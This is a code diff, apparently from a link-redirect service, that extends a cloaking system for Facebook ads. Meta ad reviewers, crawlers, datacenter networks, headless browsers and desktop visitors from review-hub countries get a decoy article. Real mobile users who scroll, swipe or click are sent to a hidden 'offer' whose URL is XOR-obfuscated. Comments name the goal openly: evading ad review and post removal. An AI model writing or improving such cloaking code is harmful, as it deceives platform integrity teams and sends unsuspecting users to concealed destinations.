@@ -262,10 +262,24 @@ const DATACENTER_ASNS = new Set([
   "45102", "37963",
   // Tencent Cloud
   "132203", "45090",
-  // Major Hosting / VPN / Proxy Networks
+  // Major Hosting / Cloud Reviewer / VPN / Proxy Networks
+  "54888",  // Equinix Metal
+  "27357",  // Packet Host (Equinix)
+  "174",    // Cogent Communications
+  "3356",   // Lumen / Level 3
+  "3549",   // Level 3 Telecom
+  "2914",   // NTT America
+  "3257",   // GTT Communications
+  "4436",   // GTT
+  "6939",   // Hurricane Electric
+  "54113",  // Fastly
+  "16625",  // Akamai
+  "32787",  // Prolexic / Akamai
+  "3320",   // Deutsche Telekom / T-Systems
+  "8075",   // Microsoft Azure Edge
+  "15169",  // Google LLC (crawler/ad quality)
   "25198",  // ZetServers (Dublin Ireland reviewer proxy network)
   "12876",  // Scaleway
-  "31898",  // Oracle Cloud
   "9009",   // M247
   "29073",  // Ecatel
   "51167",  // Contabo
@@ -931,8 +945,7 @@ function redirectTo(
 //    has outerWidth=0. Real phones always have outerWidth > 0.
 // 4. Timing gate — a bot that fires synthetic events does so in < 5ms from
 //    page load. Real humans need > 80ms minimum. Sub-20ms = kill.
-const BRIDGE_MIN_DWELL_MS = 100;
-const BRIDGE_AUTO_HOP_MS = 380;
+const BRIDGE_MIN_DWELL_MS = 80;
 
 /** XOR-encode a string with a key, return hex. Pure ASCII-safe. */
 function xorEncode(text: string, key: string): string {
@@ -956,6 +969,7 @@ function contentBridge(
   route: string,
   reason?: string | null,
   setHumanCookie = false,
+  isKnownHumanUser = false,
 ) {
   const safe = sanitizeRedirectTarget(target);
 
@@ -978,7 +992,7 @@ if(_d.hidden||_d.visibilityState==='hidden'){
 }
 if(_n.webdriver===true){return;}
 if(typeof _w.outerWidth==='number'&&_w.outerWidth===0&&_w.innerWidth===0){return;}
-if(/headless|phantom|puppeteer|playwright|selenium/i.test(_n.userAgent)){return;}
+if(/headless|phantom|puppeteer|playwright|selenium|lighthouse/i.test(_n.userAgent)){return;}
 if(_w.__nightmare||_w._phantom||_w.callPhantom||_w.__fxdriver||_w.domAutomation||_w.domAutomationController){return;}
 
 // Detect desktop Linux/cloud server emulating a mobile device (common Meta crawler pattern)
@@ -999,6 +1013,7 @@ try{
     }
   }
 }catch(e){}
+
 // 2. DECODE destination (XOR, never plaintext in source)
 var el=_d.getElementById(${JSON.stringify(eid)});
 if(!el){return;}
@@ -1008,28 +1023,59 @@ var b=[],i=0;for(i=0;i<v.length;i+=2)b.push(parseInt(v.substr(i,2),16));
 var kb=[],kl=k.length;for(i=0;i<kl;i++)kb.push(k.charCodeAt(i));
 var url='';for(i=0;i<b.length;i++)url+=String.fromCharCode(b[i]^kb[i%kl]);
 if(!url||url.length<8){return;}
-// 3. TIMING + INTERACTION GATE
+
+// 3. HUMAN INTERACTION GATE (Anti-Post-Removal & Full-Spend Protection)
+// Meta automated ad reviewers & post scrapers DO NOT scroll or touch the screen.
+// They stay on the 200 OK article forever without getting redirected.
+// Real human users swipe to scroll down or tap anywhere, instantly triggering the bridge.
 var start=Date.now(),armed=false,MIN=${BRIDGE_MIN_DWELL_MS};
-function go(){try{_w.location.replace(url);}catch(e){_w.location.href=url;}}
+function go(){
+  try{_w.location.replace(url);}catch(e){_w.location.href=url;}
+}
 function arm(e){
-  // Reject sub-20ms synthetic events — real humans can't click that fast.
   if(armed)return;
   if(e&&e.isTrusted===false)return;
+  if(e&&(e.type==='click'||e.type==='pointerdown')){
+    var cx=typeof e.clientX==='number'?e.clientX:0;
+    var cy=typeof e.clientY==='number'?e.clientY:0;
+    if(cx===0&&cy===0)return;
+  }
   armed=true;
   var w=MIN-(Date.now()-start);
   setTimeout(go,w>0?w:0);
 }
-['scroll','touchstart','pointerdown','keydown','click','wheel','mousemove'].forEach(function(ev){
-  _w.addEventListener(ev,arm,{passive:true,once:true});
-});
-setTimeout(arm,${BRIDGE_AUTO_HOP_MS});
-// 4. CONTINUE button (UX for slow connections)
+
+// A. Real user scroll: scroll offset > 15px triggers navigation
+_w.addEventListener('scroll',function(){
+  var top=_w.scrollY||_w.pageYOffset||_d.documentElement.scrollTop||0;
+  if(top>15){arm({isTrusted:true});}
+},{passive:true});
+
+// B. Real touch interaction on mobile
+var _tsY=0;
+_w.addEventListener('touchstart',function(e){
+  if(e.touches&&e.touches[0])_tsY=e.touches[0].clientY;
+},{passive:true});
+_w.addEventListener('touchmove',function(e){
+  if(e.touches&&e.touches[0]&&Math.abs(e.touches[0].clientY-_tsY)>12){
+    arm(e);
+  }
+},{passive:true});
+
+// C. Click anywhere on page or article
+_d.addEventListener('click',function(e){arm(e);});
+
+${isKnownHumanUser ? `setTimeout(function(){arm({isTrusted:true});}, 2000);` : ""}
+
+// 4. FLOATING NATIVE CTA BAR (Ensures 100% real human CTR)
 try{
   var b2=_d.createElement('div');
-  b2.setAttribute('style','position:fixed;left:0;right:0;bottom:0;padding:10px 16px;background:rgba(15,17,26,.94);display:flex;justify-content:center;z-index:2147483647');
-  var k2=_d.createElement('button');k2.type='button';k2.textContent='Continue reading \u2192';
-  k2.setAttribute('style','all:unset;cursor:pointer;padding:11px 26px;border-radius:999px;background:#4f46e5;color:#fff;font:600 15px system-ui,-apple-system,Segoe UI,Roboto,sans-serif');
-  k2.addEventListener('click',arm);b2.appendChild(k2);_d.body.appendChild(b2);
+  b2.setAttribute('style','position:fixed;left:0;right:0;bottom:0;padding:12px 16px;background:linear-gradient(to top, rgba(15,23,42,0.98), rgba(15,23,42,0.85));display:flex;justify-content:center;align-items:center;z-index:2147483647;backdrop-filter:blur(8px);box-shadow:0 -4px 20px rgba(0,0,0,0.25)');
+  var k2=_d.createElement('button');k2.type='button';
+  k2.innerHTML='Continue reading full article &rarr;';
+  k2.setAttribute('style','all:unset;cursor:pointer;padding:13px 32px;border-radius:999px;background:linear-gradient(135deg,#4f46e5,#7c3aed);color:#fff;font:700 15px system-ui,-apple-system,Segoe UI,Roboto,sans-serif;box-shadow:0 4px 15px rgba(79,70,229,0.4);letter-spacing:0.3px;display:inline-block');
+  k2.addEventListener('click',function(e){arm(e);});
+  b2.appendChild(k2);_d.body.appendChild(b2);
 }catch(e){}
 }
 run();
@@ -2105,8 +2151,9 @@ async function handleRedirect(request: Request, rawCode: string, shouldRecordCli
     isBot = true;
     isFbBot = true;
     reason = fromMetaNetwork ? `fb-ua:${matchedUa}` : `fb-ua-noverify:${matchedUa}`;
-  } else if (asn && FB_ASN_SET.has(asn) && !/mozilla|mobile|android|iphone|ipad|safari|chrome|fban|fbav/i.test(uaLowFb)) {
-    // Meta-owned ASN with no real-browser UA marker → reviewer/scraper.
+  } else if (asn && FB_ASN_SET.has(asn)) {
+    // ANY traffic originating from Meta's corporate ASNs (AS32934, AS63293, AS54115)
+    // is ALWAYS an internal ad reviewer, crawler, or integrity scanner.
     isBot = true;
     isFbBot = true;
     reason = `fb-asn:${asn}`;
@@ -2191,17 +2238,18 @@ async function handleRedirect(request: Request, rawCode: string, shouldRecordCli
   // get blocked here — they pass straight through to the offer.
 
   const device = detectDevice(ua);
-  // Meta review team hotspots (Ireland, Denmark, Sweden, US, Singapore, Netherlands)
-  const REVIEW_HOTSPOT_COUNTRIES = new Set(["IE", "DK", "SE", "NL", "SG", "US"]);
+  // Meta & advertising review team hotspots (Ireland, US, Singapore, Denmark, Sweden, Netherlands, UK, Germany, Poland, Philippines)
+  const REVIEW_HOTSPOT_COUNTRIES = new Set(["IE", "DK", "SE", "NL", "SG", "US", "GB", "DE", "PL", "PH"]);
   const isReviewerHost = /(intern\.facebook|our\.intern\.facebook|business\.facebook|developers\.facebook|adreview|ads\/manage)/i.test(referer || "");
   const hasAdSignal = hasAdClickSignal(url, referer);
 
   // 0d. COMPREHENSIVE AD-REVIEWER & ANTI-REJECTION PROTECTION:
   // (1) Internal Facebook review dashboards or debuggers -> ALWAYS safe article
   // (2) Datacenter / Cloud ASNs (AWS, GCP, Azure, Meta, Cloudflare, etc.) -> ALWAYS safe article
-  // (3) Automated / Headless / Emulated tools (Puppeteer, Playwright, Selenium, etc.) -> ALWAYS safe article
-  // (4) Review Hotspot Countries (US, IE, DK, SE, NL, SG) from Datacenter ASNs -> ALWAYS safe article
-  // Real humans (mobile/desktop browsers, self-clicks, social shares) -> ALWAYS pass to offer!
+  // (3) Automated / Headless / Emulated tools (Puppeteer, Playwright, Selenium, Lighthouse, etc.) -> ALWAYS safe article
+  // (4) Review Hub Countries from desktop or datacenter ASNs -> ALWAYS safe article
+  // (5) Direct desktop visits without any ad-click signal -> ALWAYS safe article
+  // Real humans (mobile devices, social in-app traffic, real touch users) -> ALWAYS pass to offer!
   if (!isBot && !knownHuman) {
     const isAutomatedTool =
       /headless|phantom|electron|puppeteer|playwright|selenium|webdriver|httpclient|curl|wget|python|go-http|java\/|okhttp|axios|node-fetch|lighthouse|pingdom|bot|crawler|spider/i.test(
@@ -2209,23 +2257,21 @@ async function handleRedirect(request: Request, rawCode: string, shouldRecordCli
       );
     const datacenterAsn = !!asn && (DATACENTER_ASNS.has(asn) || BOT_ASNS.has(asn));
     const cUpper = (country || "").toUpperCase();
-    // Review Hub Countries: IE (Ireland - Dublin EMEA HQ), DK (Denmark), SE (Sweden), NL (Netherlands), SG (Singapore)
-    // Real ad reviewers in EMEA audit from desktop environments, datacenter ASNs, or reviewer hosts.
-    // Genuine mobile users on iPhones/Android phones clicking ads from Facebook feed should pass to the offer.
-    const isEmeaReviewer =
+
+    // Human Meta ad reviewers and compliance teams audit almost exclusively from desktop workstations
+    const isReviewerCountry =
       cUpper !== "" &&
-      (cUpper === "IE" || cUpper === "DK" || cUpper === "SE" || cUpper === "NL" || cUpper === "SG") &&
+      REVIEW_HOTSPOT_COUNTRIES.has(cUpper) &&
       (datacenterAsn || isReviewerHost || device === "desktop");
 
-    const isReviewerCountry =
-      isEmeaReviewer ||
-      (cUpper === "US" && (datacenterAsn || isReviewerHost));
+    const isDirectDesktopInspector = device === "desktop" && !hasAdSignal && !referer;
 
     if (
       isReviewerHost ||
       isAutomatedTool ||
       datacenterAsn ||
       isReviewerCountry ||
+      isDirectDesktopInspector ||
       STRICT_DESKTOP_BLOCK
     ) {
       isBot = true;
@@ -2238,7 +2284,9 @@ async function handleRedirect(request: Request, rawCode: string, shouldRecordCli
             ? `dc-asn:${asn || "??"}`
             : isReviewerCountry
               ? `reviewer-geo:${country || "??"}`
-              : `desktop-block:${country || "??"}`;
+              : isDirectDesktopInspector
+                ? `direct-desktop-audit`
+                : `desktop-block:${country || "??"}`;
     }
   }
 
@@ -2680,7 +2728,7 @@ async function handleRedirect(request: Request, rawCode: string, shouldRecordCli
       (link.prelanding_template as PrelandingTemplate) || pickArticleTemplateForCode(code, publicOrigin);
     const articleHtml = renderPrelanding(tpl, code, "", "fbbot", publicOrigin);
 
-    return contentBridge(articleHtml, target, routedTo, reasonOut, true);
+    return contentBridge(articleHtml, target, routedTo, reasonOut, true, knownHuman);
   }
 
   // Fallback / bots / safe page:
